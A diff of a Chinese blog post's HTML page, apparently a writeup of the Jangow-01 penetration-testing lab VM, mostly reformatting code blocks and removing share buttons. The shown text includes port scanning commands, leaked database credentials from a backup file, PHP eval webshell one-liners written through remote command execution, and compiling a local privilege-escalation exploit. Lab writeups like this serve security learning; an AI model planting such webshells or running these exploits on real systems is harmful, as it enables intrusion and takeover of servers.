@@ -107,30 +107,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/15/Linux%E7%9A%84shell%E4%B8%AD%E5%8D%95%E3%80%81%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9A%84%E5%8C%BA%E5%88%AB/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&text=Jangow-01 Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&title=Jangow-01 Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&is_video=false&description=Jangow-01 Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=Jangow-01 Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&title=Jangow-01 Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&title=Jangow-01 Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&title=Jangow-01 Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&title=Jangow-01 Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&name=Jangow-01 Writeup&description=&lt;p&gt;该靶机整体难度不高。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/15/Jangow-01%20Writeup/&t=Jangow-01 Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">2. 信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 端口信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 网页信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. 其他信息</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.</span> <span class="toc-text">3. 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%951"><span class="toc-number">3.1.</span> <span class="toc-text">3.1. 方法1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%952"><span class="toc-number">3.2.</span> <span class="toc-text">3.2. 方法2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">4.</span> <span class="toc-text">4. 权限提升</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">5. 总结</span></a></li></ol>
     </div>
@@ -157,8 +139,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-14T16:00:00.000Z" itemprop="datePublished">2022-05-15</time>
-        
-        (Updated: <time datetime="2022-05-15T04:19:18.870Z" itemprop="dateModified">2022-05-15</time>)
         
       
     </div>
@@ -201,26 +181,13 @@
 </ul>
 <h1 id="信息收集">2. 信息收集</h1>
 <h2 id="端口信息">2.1. 端口信息</h2>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. <span class="token function">sudo</span> arp-scan -l
-<span class="token number">2</span>. <span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.46
-<span class="token number">3</span>. <span class="token function">sudo</span> nmap -p21,80 -A <span class="token number">10.0</span>.2.46<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. sudo arp-scan -l</span><br><span class="line">2. sudo nmap -p- 10.0.2.46</span><br><span class="line">3. sudo nmap -p21,80 -A 10.0.2.46</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515093442.png" /></p>
 <h2 id="网页信息">2.2. 网页信息</h2>
 <p>直接访问网页，发现一个目录 site，点击进入真正的页面，但是该页面没有功能点很少，当点击 Buscar 时，url 出现了变化，并且页面变白了</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515115900.png" /></p>
 <p>但是还不知道这里的用途是什么。</p>
-<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">$servername = "localhost";
-$database = "jangow01";
-$username = "jangow01";
-$password = "abygurl69";
-// Create connection
-$conn = mysqli_connect($servername, $username, $password, $database);
-// Check connection
-if (!$conn) &#123;
-    die("Connection failed: " . mysqli_connect_error());
-&#125;
-echo "Connected successfully";
-mysqli_close($conn);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>对 10.0.2.46 进行路径扫描，得到一个备份文件 .backup ，其中内容如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$servername = &quot;localhost&quot;;</span><br><span class="line">$database = &quot;jangow01&quot;;</span><br><span class="line">$username = &quot;jangow01&quot;;</span><br><span class="line">$password = &quot;abygurl69&quot;;</span><br><span class="line">// Create connection</span><br><span class="line">$conn = mysqli_connect($servername, $username, $password, $database);</span><br><span class="line">// Check connection</span><br><span class="line">if (!$conn) &#123;</span><br><span class="line">    die(&quot;Connection failed: &quot; . mysqli_connect_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;Connected successfully&quot;;</span><br><span class="line">mysqli_close($conn);</span><br></pre></td></tr></table></figure></p>
 <h2 id="其他信息">2.3. 其他信息</h2>
 <p>目前只有ftp需要登录信息，因此登录进去，在/var/www/html/site中找到了 burque.php 文件，内容如下：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121915.png" /></p>
@@ -233,8 +200,7 @@ mysqli_close($conn);<span aria-hidden="true" class="line-numbers-rows"><span></s
 <p>如果端口被做了限制，那就使用54/UDP, 80/TCP, 443/TCP。第一个是DNS默认的端口，80为http默认端口，443为https默认端口，一般都处于开放状态，且允许发送、接收数据。</p>
 </blockquote>
 <h2 id="方法2">3.2. 方法2</h2>
-<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话： <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">echo "&lt;?php eval($_POST['cmd']);?>" > reve.php
-echo '&lt;?php eval($_POST["cmd"]);?>' > rev.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>我最开始没想到方法1，想着是在没办法，先利用 RCE 写入一句话： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot; &gt; reve.php</span><br><span class="line">echo &#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27; &gt; rev.php</span><br></pre></td></tr></table></figure></p>
 <p>后者可以，前者不可以</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103711.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515103725.png" /></p>
@@ -247,44 +213,9 @@ echo '&lt;?php eval($_POST["cmd"]);?>' > rev.php<span aria-hidden="true" class="
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121146.png" /></p>
 <p>然后依次执行。现在kali上搜索</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121209.png" /></p>
-<p>然后利用蚁剑将文件传输到靶机，编译、执行 <pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token number">1</span>. gcc <span class="token number">45010</span>.c -o exp1
-<span class="token number">2</span>. <span class="token function">chmod</span> +x exp1
-<span class="token number">3</span>. ./exp1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>然后利用蚁剑将文件传输到靶机，编译、执行 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. gcc 45010.c -o exp1</span><br><span class="line">2. chmod +x exp1</span><br><span class="line">3. ./exp1</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220515121323.png" /></p>
-<p>最后的收尾工作，读取两个flag <pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// 1. /home/jangow01/user.txt
-d41d8cd98f00b204e9800998ecf8427e
-
-// 2. /root/proof.txt
-                @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                                                        
-                @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                                                                                        
-                @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                                                                                        
-                @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                                                                                        
-                @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                                                                                  
-                @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                                                                                  
-                @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                                                                                  
-                @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                                                                                 
-                @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                                                                                 
-                @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                                                                                
-                @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 
-                 @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 
-                @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 
-                @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  
-                @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  
-                @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   
-                @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    
-                @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    
-                @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    
-                @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    
-                @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          
-                @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          
-                              &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                
-                                (((((((((((((((((((((((((((((
-
-
-
-
-
-da39a3ee5e6b4b0d3255bfef95601890afd80709<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>最后的收尾工作，读取两个flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// 1. /home/jangow01/user.txt</span><br><span class="line">d41d8cd98f00b204e9800998ecf8427e</span><br><span class="line"></span><br><span class="line">// 2. /root/proof.txt</span><br><span class="line">                @@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@@@@@@@@@@@@@&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;                                                                                        </span><br><span class="line">                @  @@@@@@@@@@@@@@@&amp;#   #@@@@@@@@&amp;(.    /&amp;@@@@@@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@@@@&amp;( .@@@@@@@@&amp;%####((//#&amp;@@@&amp;   .&amp;@@@@@                                                                                        </span><br><span class="line">                @  @@@@@@@&amp;  @@@@@@&amp;@@@@@&amp;%######%&amp;@*   ./@@*   &amp;@@                                                                                        </span><br><span class="line">                @  @@@@@* (@@@@@@@@@#/.               .*@.  .#&amp;.   &amp;@@@&amp;&amp;                                                                                  </span><br><span class="line">                @  @@@, /@@@@@@@@#,                       .@.  ,&amp;,   @@&amp;&amp;                                                                                  </span><br><span class="line">                @  @&amp;  @@@@@@@@#.         @@@,@@@/           %.  #,   %@&amp;                                                                                  </span><br><span class="line">                @@@#  @@@@@@@@/         .@@@@@@@@@@            *  .,    @@                                                                                 </span><br><span class="line">                @@&amp;  @@@@@@@@*          @@@@@@@@@@@             ,        @                                                                                 </span><br><span class="line">                @&amp;  .@@@@@@@(      @@@@@@@@@@@@@@@@@@@@@        *.       &amp;@                                                                                </span><br><span class="line">                @@/  *@@@@@@@/           @@@@@@@@@@@#                      @@                 </span><br><span class="line">                 @@   .@@@@@@@/          @@@@@@@@@@@@@              @#      @@                 </span><br><span class="line">                @@    @@@@@@@@.          @@@@@@@@@@@              @@(      @@                 </span><br><span class="line">                @&amp;   .@@@@@@@@.         , @@@@@@@ *            .@@@*(    .@                  </span><br><span class="line">                @@    ,@@@@@@@@,   @@@@@@@@@&amp;*%@@@@@@@@@,    @@@@@(%&amp;*   &amp;@                  </span><br><span class="line">                @@&amp;     @@@@@@@@@@@@@@@@@         (@@@@@@@@@@@@@@%@@/   &amp;@                   </span><br><span class="line">                @ @&amp;     ,@@@@@@@@@@@@@@@,@@@@@@@&amp;%@@@@@@@@@@@@@@@%*   &amp;@                    </span><br><span class="line">                @  @@.     .@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%*    &amp;@&amp;                    </span><br><span class="line">                @  @@@&amp;       ,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%/     &amp;@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@.        *%@@@@@@@@@@@@@@@@@@@@&amp;#/.      &amp;@@@@&amp;&amp;                    </span><br><span class="line">                @  @@@@@@@@&amp;               JANGOW               &amp;@@@                          </span><br><span class="line">                @  &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;@@@&amp;     @@(&amp;@ @. %.@ @@%@     &amp;@@@&amp;&amp;&amp;&amp;                          </span><br><span class="line">                              &amp;&amp;&amp;@@@@&amp;%       &amp;/    (&amp;&amp;@@@&amp;&amp;&amp;                                </span><br><span class="line">                                (((((((((((((((((((((((((((((</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br></pre></td></tr></table></figure></p>
 <h1 id="总结">5. 总结</h1>
 <p>该靶机整体难度不高，唯一的难点在于对端口做了限制。涉及到一下攻击方法：</p>
 <ol type="1">
@@ -347,7 +278,6 @@ da39a3ee5e6b4b0d3255bfef95601890afd80709<span aria-hidden="true" class="line-num
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
